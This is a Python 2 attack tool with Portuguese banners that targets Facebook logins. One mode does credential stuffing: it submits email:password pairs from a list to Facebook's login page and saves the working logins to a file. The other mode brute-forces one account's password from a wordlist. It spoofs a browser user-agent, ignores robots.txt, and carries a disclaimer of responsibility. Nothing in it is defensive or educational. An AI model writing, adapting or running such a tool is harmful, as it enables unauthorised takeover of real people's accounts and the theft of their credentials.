#!/usr/bin/python
# -*- coding:utf-8 -*- 

#pip install mechanize
# or download the mechanize distribuition archive, open it, and run:
# python setup.py install
# http://wwwsearch.sourceforge.net/mechanize/src/

import mechanize
import os
import time
import sys

cyanClaro="\033[1;36m"
vermelho = '\033[31;1m'
verde = '\033[32;1m'
azul = '\033[34;1m'
amarelo= '\033[1;33m'
os.system('clear')

Cicada3301 = """
               
		     ───▄█▌─▄─▄─▐█▄  łαbørαŧøriø Ŧαηŧαรмα
		     ───██▌▀▀▄▀▀▐██
		     ───██▌─▄▄▄─▐██
		     ───▀██▌▐█▌▐██▀  
		     ▄██████─▀─██████▄ 
        +=========================================+
        |......♚ Solyd - Sistema de Ensinos.......|
        +-----------------------------------------+
        |♚ Coded: @DreadPirateRobertt (Telegram)  |
        |♚ Date: 05/04/2017                       |
        |♚ Chanell:telegram.me/Phantasm_Lab       |
        |♚ Changing the Description of this tool  |
        |Won't made you the coder ^_^ !!!         |
        |♚Respect Coderz ^_^(Open_Source_Project) |
        |♚I take no responsibilities for the      |
        |  use of this program !                  |
        +=========================================+
        |..♚ Use: youremailtest@gmail.com:12345 ..|
        +=========================================+
        +=========================================+
        |........♚ łαbørαŧøriø Ŧαηŧαรмα...........|
        +-----------------------------------------+

            ☤ [1] Lista > Email e Senha!..
            ☤ [2] Lista de Senhas..
"""

Solyd = """
  +=====================================================+
  |............♚ Facebook - Login Acounts ♚.............|
  +-----------------------------------------------------+"""

GhostLab ="""  +=====================================================+
  |...............♚ łαbørαŧøriø Ŧαηŧαรмα ♚..............|
  +-----------------------------------------------------+"""  

print Cicada3301


def help():
	print(azul+'Modo de uso:')
	print(azul+'$ python2 FacebookLocked.py\n')
	print(azul+'Example > [1] email > Wordlist.txt')
	print(azul+'Example > [2] Phantasm_Lab@gmail.com:PhantasmLab')
	print('')
	print cyanClaro + 'NOTA > Na opção 2 as listas de emails e senhas deveram conter o seguinte separador ":" \nComo podemos ver no Exemplo há cima....'

try:
  x = sys.argv[1]
  if x == '-h' or x == '--help':
    help()
    print('')
except:
	print ('')


try:
	opt = raw_input(amarelo + '[*] Choose an Option > ')
except KeyboardInterrupt:
	print(vermelho+"\n \n[-] Exiting....")
	time.sleep(1)
	exit()
print('')

def G_Quan():
	WordList = raw_input(amarelo + "Digite o Nome da sua Wordlist.txt: ")
	var = open(WordList, 'r').readlines()
	fp = open("FacebookLogins.txt", "w")
	for line in var:
		br = mechanize.Browser()
		br.set_handle_robots(False)
		br.addheaders = [('User-agent', 'Firefox')]
		br.open('https://www.facebook.com/login.php')
		br.select_form(nr=0)

		line = line.strip()
		USERNAME, PASSWORD = line.split(":")
		br.form['email'] = USERNAME
		br.form['pass'] = PASSWORD
		sub = br.submit()
		ttr = sub.geturl()
		if ttr == 'https://www.facebook.com/login.php?login_attempt=1&lwv=100':
			print (vermelho + Solyd)
			print vermelho+"  |       ♚ ✘✘✘ Die Acount... Login Down! ✘✘✘           |"
			print vermelho+"  |       ♚ ✘✘✘ Login Ou Senha Incorretos! ✘✘✘          |"
			print vermelho+"  |    ♚ ✅ Login ➣",line,"        |"
			print (vermelho + GhostLab) 
		else:
			print (verde + Solyd)
			print verde+"  |      ♚ ✅  Live Acount... Login Actived!             |"
			print verde+"  |      ♚ ✅ Wellcome to facebook Acount                |"
			print verde+"  |    ♚ ✅ Login ➣",line,"        |"
			print (verde + GhostLab)
			print('')
			try:
				fp.write("%s\n" % line)
				fp.flush()
			except IOError:
				print "[✘] Falha ao salvar o arquivo no diretorio especificado"
				sys.exit(1)
	
		time.sleep(1.5)

	fp.close()
	print "[✅] Logins salvos em arquivo chamado: FacebookLogins.txt! "

def Black_Ninja():
	 user = raw_input(cyanClaro + "💉  Enter for your Username or Email >>> ")
	 print('')
	 passwfile = raw_input(verde + "💉  Digite o nome de sua wordlist: ")
	 print('')
	 
	 passwfile = open(passwfile, "r")

	 for password in passwfile:
	 	try:
	 		br = mechanize.Browser()
	 		br.set_handle_robots(False)
	 		br.addheaders = [('User-agent', 'Firefox')]
	 		br.open('https://www.facebook.com/login.php')
	 		br.select_form(nr=0)
	 		br.form['email'] = user
	 		br.form['pass'] = password
	 		sub = br.submit()
	 		ttr = sub.geturl()
	 		if ttr == 'https://www.facebook.com/login.php?login_attempt=1&lwv=100':
	 			print (vermelho + Solyd)
	 			print vermelho+"  |       ♚ ✘✘✘ Die Acount... Login Down! ✘✘✘           |"
	 			print vermelho+"  |       ♚ ✘✘✘ Login Ou Senha Incorretos! ✘✘✘          |"
	 			print vermelho+"  |                  ♚ ✅ Login:                        |"
	 			print verde + "[+] Email > %s" % user,"\n","[+] Password Found > %s" % password, "\n"
	 			print vermelho + GhostLab
	 		else:
	 			print (verde + Solyd)
	 			print('')
	 			print verde + "[+] Email > %s" % user,"\n","[+] Password Found > %s" % password, "\n"
	 			print (verde + GhostLab)
	 	except KeyboardInterrupt:
	 		print('Exit')
	 		sys.exit(1)		

def main():
	if opt == '1':
		try:
			G_Quan()
		except KeyboardInterrupt:
			print(vermelho + '\n \n[-] Exiting...')
			time.sleep(1)
			os.system('clear')
			exit()
	elif opt == '2':
		try:
			Black_Ninja()		
		except KeyboardInterrupt:
			print(vermelho + "\n \n[-] Exiting....")
			time.sleep(1)
			os.system('clear')
			exit()

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print(vermelho+'\n\n[-] Exiting...')
		time.sleep(1)
		os.system('clear')
		exit()
